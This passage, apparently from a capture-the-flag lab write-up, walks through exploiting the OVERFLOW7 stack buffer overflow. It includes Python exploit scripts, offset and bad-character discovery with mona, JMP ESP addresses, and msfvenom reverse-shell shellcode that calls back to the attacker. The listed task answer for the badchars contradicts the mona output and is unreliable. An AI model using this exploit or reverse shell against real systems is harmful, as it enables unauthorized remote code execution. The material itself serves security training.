payload = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9"           # The malicious payload (e.g., shellcode) to execute on the target
postfix = ""           # Any additional data that needs to be sent after the payload

# Final buffer
buffer = prefix + overflow + retn + padding + payload + postfix  # Combine all parts to form the final buffer

# Socket setup and buffer sending
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Create a TCP socket
try:
    s.connect((ip, port))  # Attempt to connect to the target IP and port
    print("Sending evil buffer...")  # Inform that the buffer is being sent
    s.send(bytes(buffer + "\r\n", "latin-1"))  # Send the buffer, ensuring it is encoded in "latin-1"
    print("Done!")  # Confirm that the buffer was sent successfully
except Exception as e:  # If an error occurs (e.g., connection fails)
    print(f"Could not connect: {e}")  # Print an error message with details
```


14. In target machine. Immunity Debugger > Debug > Restart > Play.


15. In Kali. Execute the exploit.py.

![800](img/Pasted%20image%2020240821150355.png)


16. Immunity Debugger. EIP 72423572.

![800](img/Pasted%20image%2020240903171136.png)


17. In Kali. Get the offset value of the EIP.

```shell
┌──(root㉿kali)-[/transfer]
└─# msf-pattern_offset -l 1800 -q 72423572
[*] Exact match at offset 1306
```

EIP Offset is 1306.

	Task 8
		a. What is the EIP offset for OVERFLOW7?
			1306


18. In Kali. Edit the exploit.py. Add the offset 1306 and put a retn to be reflected, can use "BBBB"

```python
import socket  # Import the socket module to create and manage network connections

# Target configuration
ip = "target.local"  # The IP address of the target system
port = 1337          # The port on which the target service is listening

# Buffer composition
prefix = "OVERFLOW7 "  # The command or identifier expected by the target service
offset = 1306            # The number of bytes needed to reach the return address
overflow = "A" * offset  # Filling the buffer up to the offset with "A"s
retn = "BBBB"              # Placeholder for the return address (where execution should jump)
padding = ""           # Optional padding between the return address and the payload
payload = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9"           # The malicious payload (e.g., shellcode) to execute on the target
postfix = ""           # Any additional data that needs to be sent after the payload

# Final buffer
buffer = prefix + overflow + retn + padding + payload + postfix  # Combine all parts to form the final buffer

# Socket setup and buffer sending
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Create a TCP socket
try:
    s.connect((ip, port))  # Attempt to connect to the target IP and port
    print("Sending evil buffer...")  # Inform that the buffer is being sent
    s.send(bytes(buffer + "\r\n", "latin-1"))  # Send the buffer, ensuring it is encoded in "latin-1"
    print("Done!")  # Confirm that the buffer was sent successfully
except Exception as e:  # If an error occurs (e.g., connection fails)
    print(f"Could not connect: {e}")  # Print an error message with details

```


19. In target machine. Immunity Debugger > Debug > Restart > Play.


20. In Kali. Execute exploit.py.

![800](img/Pasted%20image%2020240821152534.png)


21. Immunity Debugger. Note the value ESP 0199F4F8.

![800](img/Pasted%20image%2020240903171424.png)


22. In Immunity Debugger. Create a BADCHARS using mona. By default the syntax \\x00 is a BADCHAR.

`!mona bytearray -b "\x00"

![800](img/Pasted%20image%2020240903171518.png)


23. Creating bad chars. In Kali. By using a python script. Generate a string of bad chars from \\x01 to \\xff.

```python
#!/usr/bin/env python3

from __future__ import print_function

#tart with 00 and add any others you find
bad = "00".split()

#turns them into a nice string to copy into python
print("badchars = ")
for x in range(1, 256):
	if "{:02x}".format(x) not in bad: 
		print("\\x" + "{:02x}".format(x), end='')

#creates a nice string to use in Mona
print("\n\nfor mona")
for byte in bad:
	print("\\x{}".format(byte), end='')
print()
```

```shell
┌──(root㉿kali)-[/transfer]
└─# python3 create.py 
badchars = 
\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff

for mona
\x00
```


24. Using the generated bad chars, copy and edit the exploit.py.

```python
import socket  # Import the socket module to create and manage network connections

# Target configuration
ip = "target.local"  # The IP address of the target system
port = 1337          # The port on which the target service is listening

# Buffer composition
prefix = "OVERFLOW7 "  # The command or identifier expected by the target service
offset = 1306             # The number of bytes needed to reach the return address
overflow = "A" * offset  # Filling the buffer up to the offset with "A"s
retn = "BBBB"              # Placeholder for the return address (where execution should jump)
padding = ""           # Optional padding between the return address and the payload
payload = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"           # The malicious payload (e.g., shellcode) to execute on the target
postfix = ""           # Any additional data that needs to be sent after the payload

# Final buffer
buffer = prefix + overflow + retn + padding + payload + postfix  # Combine all parts to form the final buffer

# Socket setup and buffer sending
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Create a TCP socket
try:
    s.connect((ip, port))  # Attempt to connect to the target IP and port
    print("Sending evil buffer...")  # Inform that the buffer is being sent
    s.send(bytes(buffer + "\r\n", "latin-1"))  # Send the buffer, ensuring it is encoded in "latin-1"
    print("Done!")  # Confirm that the buffer was sent successfully
except Exception as e:  # If an error occurs (e.g., connection fails)
    print(f"Could not connect: {e}")  # Print an error message with details
```


25. In target machine. Immunity Debugger > Debug > Restart > Play.


26. Execute exploit.py

```shell
┌──(root㉿kali)-[/transfer]
└─# python3 exploit.py
Sending evil buffer...
Done!
```


27. In Immunity Debugger.  ESP 0194FA30.

![800](img/Pasted%20image%2020240903171705.png)


28. In Immunity Debugger. Run the mona command to compare the bin and ESP value.

`!mona compare -f C:\mona\oscp\bytearray.bin -a 0194FA30

![800](img/Pasted%20image%2020240903171755.png)

mona Memory comparison results, item 0
 Address=0x0194fa30
 Status=Corruption after 139 bytes
 BadChars=00 8c 8d ae af be bf fb fc
 Type=normal
 Location=Stack


29. Based on the output 00 8c 8d ae af be bf fb fc. Only use 00 8c ae be fb to be excluded in creating the bad chars. Edit the create.py.


```python
#!/usr/bin/env python3

from __future__ import print_function

#tart with 00 and add any others you find
bad = "00 8c ae be fb".split()

#turns them into a nice string to copy into python
print("badchars = ")
for x in range(1, 256):
	if "{:02x}".format(x) not in bad: 
		print("\\x" + "{:02x}".format(x), end='')

#creates a nice string to use in Mona
print("\n\nfor mona")
for byte in bad:
	print("\\x{}".format(byte), end='')
print()
```


```shell
┌──(root㉿kali)-[/transfer]
└─# python3 create.py 
badchars = 
\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfc\xfd\xfe\xff

for mona
\x00\x8c\xae\xbe\xfb
```

	Task 8
		b. In byte order (e.g. \x00\x01\x02) and including the null byte \x00, what were the badchars for OVERFLOW7?
			\x00\x08\x2c\xad


30. In target machine. Immunity Debugger. Tell mona to update the bytearray.

`!mona bytearray -b "\x00\x8c\xae\xbe\xfb"

![800](img/Pasted%20image%2020240903172012.png)


31. In target machine. Immunity Debugger > Debug > Restart > Play.


32. Edit the exploit.py with the bad chars. Then execute the exploit.py.

```python
import socket  # Import the socket module to create and manage network connections

# Target configuration
ip = "target.local"  # The IP address of the target system
port = 1337          # The port on which the target service is listening

# Buffer composition
prefix = "OVERFLOW7 "  # The command or identifier expected by the target service
offset = 1306             # The number of bytes needed to reach the return address
overflow = "A" * offset  # Filling the buffer up to the offset with "A"s
retn = "BBBB"              # Placeholder for the return address (where execution should jump)
padding = ""           # Optional padding between the return address and the payload
payload = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfc\xfd\xfe\xff"           # The malicious payload (e.g., shellcode) to execute on the target
postfix = ""           # Any additional data that needs to be sent after the payload

# Final buffer
buffer = prefix + overflow + retn + padding + payload + postfix  # Combine all parts to form the final buffer

# Socket setup and buffer sending
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Create a TCP socket
try:
    s.connect((ip, port))  # Attempt to connect to the target IP and port
    print("Sending evil buffer...")  # Inform that the buffer is being sent
    s.send(bytes(buffer + "\r\n", "latin-1"))  # Send the buffer, ensuring it is encoded in "latin-1"
    print("Done!")  # Confirm that the buffer was sent successfully
except Exception as e:  # If an error occurs (e.g., connection fails)
    print(f"Could not connect: {e}")  # Print an error message with details
```

![](img/Pasted%20image%2020240829171740.png)


31. Immunity Debugger. Compare using mona.

** Do not restart Immunity Debbuger.

`!mona compare -f C:\mona\oscp\bytearray.bin -a esp

![800](img/Pasted%20image%2020240903172210.png)


32. Immunity Debugger > Debug > Restart


33. Use the command mona jmp, the esp and the excluded bad chars.

`!mona jmp -r esp -cpb "\x00\x8c\xae\xbe\xfb"

Go to View > Log 
Select and double click Log Data

![800](img/Pasted%20image%2020240903172325.png)


![800](img/Pasted%20image%2020240903172410.png)

![800](img/Pasted%20image%2020240903172508.png)

Possible JMP ESP:

625011AF
625011BB
625011C7
625011D3
625011DF
625011EB
625011F7

`\xAF\x11\x50\x62
`\xBB\x11\x50\x62
`\xC7\x11\x50\x62
`\xD3\x11\x50\x62
`\xDF\x11\x50\x62`
`\xEB\x11\x50\x62
`\xF7\x11\x50\x62`


34. Create shellcode using msfvenom

`msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=9009 EXITFUNC=thread -b "\x00\x8c\xae\xbe\xfb" -f python -v "shellcode"


```shell
┌──(root㉿kali)-[/transfer]
└─# msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=9009 EXITFUNC=thread -b "\x00\x8c\xae\xbe\xfb" -f python -v "shellcode"
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai failed with A valid opcode permutation could not be found.
Attempting to encode payload with 1 iterations of x86/call4_dword_xor
x86/call4_dword_xor succeeded with size 348 (iteration=0)
x86/call4_dword_xor chosen with final size 348
Payload size: 348 bytes
Final size of python file: 1953 bytes
shellcode =  b""
shellcode += b"\x31\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0"
shellcode += b"\x5e\x81\x76\x0e\x0e\x65\x13\x67\x83\xee\xfc"
shellcode += b"\xe2\xf4\xf2\x8d\x91\x67\x0e\x65\x73\xee\xeb"
shellcode += b"\x54\xd3\x03\x85\x35\x23\xec\x5c\x69\x98\x35"
shellcode += b"\x1a\xee\x61\x4f\x01\xd2\x59\x41\x3f\x9a\xbf"
shellcode += b"\x5b\x6f\x19\x11\x4b\x2e\xa4\xdc\x6a\x0f\xa2"
shellcode += b"\xf1\x95\x5c\x32\x98\x35\x1e\xee\x59\x5b\x85"
shellcode += b"\x29\x02\x1f\xed\x2d\x12\xb6\x5f\xee\x4a\x47"
shellcode += b"\x0f\xb6\x98\x2e\x16\x86\x29\x2e\x85\x51\x98"
shellcode += b"\x66\xd8\x54\xec\xcb\xcf\xaa\x1e\x66\xc9\x5d"
shellcode += b"\xf3\x12\xf8\x66\x6e\x9f\x35\x18\x37\x12\xea"
shellcode += b"\x3d\x98\x3f\x2a\x64\xc0\x01\x85\x69\x58\xec"
shellcode += b"\x56\x79\x12\xb4\x85\x61\x98\x66\xde\xec\x57"
shellcode += b"\x43\x2a\x3e\x48\x06\x57\x3f\x42\x98\xee\x3a"
shellcode += b"\x4c\x3d\x85\x77\xf8\xea\x53\x0d\x20\x55\x0e"
shellcode += b"\x65\x7b\x10\x7d\x57\x4c\x33\x66\x29\x64\x41"
shellcode += b"\x09\x9a\xc6\xdf\x9e\x64\x13\x67\x27\xa1\x47"
shellcode += b"\x37\x66\x4c\x93\x0c\x0e\x9a\xc6\x37\x5e\x35"
shellcode += b"\x43\x27\x5e\x25\x43\x0f\xe4\x6a\xcc\x87\xf1"
shellcode += b"\xb0\x84\x0d\x0b\x0d\x19\x6c\x4f\x9a\x7b\x65"
shellcode += b"\x0e\x46\x22\xee\xe8\x0f\x03\x31\x59\x0d\x8a"
shellcode += b"\xc2\x7a\x04\xec\xb2\x8b\xa5\x67\x6b\xf1\x2b"
shellcode += b"\x1b\x12\xe2\x0d\xe3\xd2\xac\x33\xec\xb2\x66"
shellcode += b"\x06\x7e\x03\x0e\xec\xf0\x30\x59\x32\x22\x91"
shellcode += b"\x64\x77\x4a\x31\xec\x98\x75\xa0\x4a\x41\x2f"
shellcode += b"\x66\x0f\xe8\x57\x43\x1e\xa3\x13\x23\x5a\x35"
shellcode += b"\x45\x31\x58\x23\x45\x29\x58\x33\x40\x31\x66"
shellcode += b"\x1c\xdf\x58\x88\x9a\xc6\xee\xee\x2b\x45\x21"
shellcode += b"\xf1\x55\x7b\x6f\x89\x78\x73\x98\xdb\xde\xf3"
shellcode += b"\x7a\x24\x6f\x7b\xc1\x9b\xd8\x8e\x98\xdb\x59"
shellcode += b"\x15\x1b\x04\xe5\xe8\x87\x7b\x60\xa8\x20\x1d"
shellcode += b"\x17\x7c\x0d\x0e\x36\xec\xb2"

```


35. Create python script for payload.py

```python
#!/usr/bin/env python3

import socket  # Import the socket library for network communication

# Target IP address and port where the vulnerable service is running
ip = 'target.local'
port = 1337

# Shellcode: This is the payload that will be executed on the target machine
# The shellcode is written in hexadecimal format representing machine instructions

shellcode =  ""
shellcode += "\x31\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0"
shellcode += "\x5e\x81\x76\x0e\x0e\x65\x13\x67\x83\xee\xfc"
shellcode += "\xe2\xf4\xf2\x8d\x91\x67\x0e\x65\x73\xee\xeb"
shellcode += "\x54\xd3\x03\x85\x35\x23\xec\x5c\x69\x98\x35"
shellcode += "\x1a\xee\x61\x4f\x01\xd2\x59\x41\x3f\x9a\xbf"
shellcode += "\x5b\x6f\x19\x11\x4b\x2e\xa4\xdc\x6a\x0f\xa2"
shellcode += "\xf1\x95\x5c\x32\x98\x35\x1e\xee\x59\x5b\x85"
shellcode += "\x29\x02\x1f\xed\x2d\x12\xb6\x5f\xee\x4a\x47"
shellcode += "\x0f\xb6\x98\x2e\x16\x86\x29\x2e\x85\x51\x98"
shellcode += "\x66\xd8\x54\xec\xcb\xcf\xaa\x1e\x66\xc9\x5d"
shellcode += "\xf3\x12\xf8\x66\x6e\x9f\x35\x18\x37\x12\xea"
shellcode += "\x3d\x98\x3f\x2a\x64\xc0\x01\x85\x69\x58\xec"
shellcode += "\x56\x79\x12\xb4\x85\x61\x98\x66\xde\xec\x57"
shellcode += "\x43\x2a\x3e\x48\x06\x57\x3f\x42\x98\xee\x3a"
shellcode += "\x4c\x3d\x85\x77\xf8\xea\x53\x0d\x20\x55\x0e"
shellcode += "\x65\x7b\x10\x7d\x57\x4c\x33\x66\x29\x64\x41"
shellcode += "\x09\x9a\xc6\xdf\x9e\x64\x13\x67\x27\xa1\x47"
